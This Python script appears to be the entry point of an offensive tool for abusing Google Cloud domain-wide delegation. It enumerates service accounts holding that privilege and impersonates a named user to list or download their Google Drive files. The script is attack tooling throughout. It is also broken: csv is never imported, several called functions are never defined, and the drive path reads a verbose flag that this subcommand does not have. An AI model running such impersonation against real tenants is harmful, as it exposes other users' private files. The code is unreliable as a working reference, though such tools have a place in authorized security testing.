import os 
import sys
from src.gcp_sa_enum import ServiceAccountEnumerator
from checkdelegation import CustomCredentials
from checkdelegation import check
from utils.text_color import print_color
import argparse


def check_gcp_bearer_access_token(testEmail, verbose):
    token = os.environ.get('GCP_BEARER_ACCESS_TOKEN')
    if token:
        try:
            credentials = CustomCredentials(token)
            enumerator = ServiceAccountEnumerator(credentials, verbose=verbose)
            if enumerator.user_email == None:
                raise Exception(print_color("[-] Error verifying token. Ensure it's refreshed.", color="red"))
            print_color(f"✓ GCP_BEARER_ACCESS_TOKEN is set with access token of {enumerator.user_email}", color="green")
            check(enumerator, testEmail, verbose)
        except Exception as e:
            print(f"An error occurred: {e}")

    else:
        print_color("GCP_BEARER_ACCESS_TOKEN environment variable is not set. This tool requires an access token for a user with the iam.ServiceAccountKeys.create permission to be set as the GCP_BEARER_ACCESS_TOKEN environment variable.\
            The token can be retrieved from an authenticated gcloud session by executing \"gcloud auth print-access-token\".", color="red")
        sys.exit(1)

def main():

    parser = argparse.ArgumentParser(description='Exploit Domain-Wide Delegation in GCP')
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    subparsers.required = True  # Make the subparser required

    # Subparser for 'enum' command
    parser_enum = subparsers.add_parser('enum', help='Enumerate GCP service accounts with DWD privileges. Requires an access token for a user with the iam.ServiceAccountKeys.create permission to be set as the GCP_BEARER_ACCESS_TOKEN environment variable.')
    # If you have additional arguments for 'enum', add them here
    parser_enum.add_argument('--verbose', action='store_true', default=False, help='Enable verbose output')
    parser_enum.add_argument('--email', type=str, help='Optional: Specify a single email to test DWD against instead of enumerating users')

    # Subparser for 'drive' command
    drive_parser = subparsers.add_parser('drive', help='Impersonate a user and perform actions on Google Drive.')

    group = drive_parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--download', action='store_true', help='Download a single file from Google Drive')
    group.add_argument('--list', action='store_true', help='List all contents of Google Drive')

    drive_parser.add_argument('--id', type=str, default=None, help='Id of the file to download.')
    drive_parser.add_argument('--impersonate', type=str, required=True, help='User to impersonate.')
    drive_parser.add_argument('--token', type=str, default=None, help='Authentication token of the impersonated user.')
    drive_parser.add_argument('--output', type=str, default=None, help='Output of the files in Google Drive')
    drive_parser.add_argument('--folder', type=str, default=None, help='List files in specific folder')

    # Parse the arguments
    args = parser.parse_args()

    verbose = args.verbose

    if args.command == 'enum':
        check_gcp_bearer_access_token(args.email, verbose)
    elif args.command == 'drive':
        OUTPUTFILE = args.output
        if OUTPUTFILE:
            with open(OUTPUTFILE, mode='w', newline='') as csv_file:
                writer = csv.writer(csv_file)
                writer.writerow(['File', 'ID', 'Size', 'Trashed', 'Extension'])

        if args.list:
            list_files(get_access_token(args.impersonate), OUTPUTFILE)

        elif args.download:
            if args.id:
                download_file(args.id, get_access_token(args.impersonate))
            else:
                parser.error("Error: Must provide a file id with --id argument.")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()